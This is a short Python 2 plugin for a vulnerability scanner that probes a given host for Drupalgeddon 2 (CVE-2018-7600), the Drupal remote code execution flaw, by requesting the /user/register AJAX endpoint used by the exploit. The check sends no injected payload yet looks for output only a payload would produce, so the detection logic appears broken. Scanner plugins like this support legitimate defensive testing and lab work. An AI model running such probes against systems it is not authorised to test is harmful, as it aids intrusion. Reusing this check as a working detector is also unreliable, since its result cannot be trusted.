# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Drupal Drupalgeddon 2 远程代码执行漏洞",
        "info": "6/7/8版本的Form API中存在一处远程代码执行漏洞，可导致服务器直接被入侵控制",
        "level": "高危",
        "type": "代码执行",
        "author": "taro",
        "url": "https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md",
        "keyword": "all:drupal",
        "source": 1
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'string(4) \"test\"' in res.text:
            info = '存在远程代码执行: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
